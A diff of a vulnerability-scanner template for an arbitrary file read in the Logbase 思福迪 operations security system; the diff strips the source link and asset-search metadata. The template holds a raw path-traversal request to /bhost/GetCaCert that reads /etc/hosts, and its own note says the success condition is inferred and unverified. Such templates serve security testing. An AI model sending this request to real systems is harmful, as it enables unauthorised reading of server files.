@@ -3,14 +3,8 @@ info:
   name: 思福迪运维安全管理系统GetCaCert存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/a1169c344352a6c6bb0552fd7fe50496
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: a1169c344352a6c6bb0552fd7fe50496
-    fofa: + hunter`app.name="Logbase 思福迪 运维安全系统"`
 http:
 - raw:
   - 'GET /bhost/GetCaCert?a1=../../../../../etc/hosts HTTP/1.1
